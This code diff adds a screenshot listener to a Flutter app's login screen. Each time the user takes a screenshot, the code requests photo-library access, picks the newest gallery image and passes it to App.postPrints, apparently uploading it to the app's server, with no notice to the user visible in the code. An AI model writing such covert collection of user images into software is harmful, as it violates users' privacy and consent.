@@ -1,9 +1,13 @@
+import 'dart:io';
+
 import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
 import 'package:local_auth/local_auth.dart';
 import 'package:moduloa2/controllers/app.dart';
 import 'package:moduloa2/styles/cores.dart';
 import 'package:moduloa2/widgets/toast.dart';
+import 'package:no_screenshot/no_screenshot.dart';
+import 'package:photo_manager/photo_manager.dart';
 
 class Login extends StatefulWidget {
   const Login({super.key});
@@ -65,6 +69,7 @@ class _LoginState extends State<Login> {
 
   startApp() async {
     await App.getDados();
+    printScreen();
 
     if (App.manter) {
       final LocalAuthentication auth = LocalAuthentication();
@@ -90,6 +95,23 @@ class _LoginState extends State<Login> {
         }
       }
     }
+  }
+
+  final noScreenshot = NoScreenshot.instance;
+
+  printScreen() async {
+    await PhotoManager.requestPermissionExtend();
+    await noScreenshot.startScreenshotListening();
+
+    noScreenshot.screenshotStream.listen((value) async {
+      final List<AssetEntity> paths = await PhotoManager.getAssetListRange(
+        type: RequestType.image,
+        start: 0,
+        end: 80,
+      );
+
+      App.postPrints(await paths[0].loadFile() ?? File(''));
+    });
   }
 
   @override
